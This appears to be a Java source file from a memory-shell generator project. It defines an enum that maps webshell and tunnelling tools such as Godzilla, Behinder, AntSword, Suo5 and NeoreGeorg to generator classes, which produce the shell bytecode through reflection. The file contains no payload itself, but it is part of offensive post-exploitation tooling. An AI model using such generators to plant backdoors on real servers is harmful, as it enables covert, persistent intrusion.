package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.generator.*;
import com.reajason.javaweb.memshell.generator.command.CommandGenerator;

import java.lang.reflect.Constructor;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public enum ShellTool {
    Godzilla(GodzillaGenerator.class, GodzillaConfig.class),
    Command(CommandGenerator.class, CommandConfig.class),
    Behinder(BehinderGenerator.class, BehinderConfig.class),
    Suo5(Suo5Generator.class, Suo5Config.class),
    AntSword(AntSwordGenerator.class, AntSwordConfig.class),
    NeoreGeorg(NeoreGeorgGenerator.class, NeoreGeorgConfig.class),
    Custom(CustomShellGenerator.class, CustomConfig.class);

    private final Class<? extends ShellGenerator> generatorClass;
    private final Class<? extends ShellToolConfig> configClass;

    ShellTool(Class<? extends ShellGenerator> generatorClass, Class<? extends ShellToolConfig> configClass) {
        this.generatorClass = generatorClass;
        this.configClass = configClass;
    }

    public byte[] generateBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        try {
            Constructor<? extends ShellGenerator> constructor =
                    generatorClass.getConstructor(ShellConfig.class, configClass);
            ShellGenerator generator = constructor.newInstance(shellConfig, configClass.cast(shellToolConfig));
            return generator.getBytes();
        } catch (Exception e) {
            throw new RuntimeException("Failed to create generator for " + this, e);
        }
    }
}
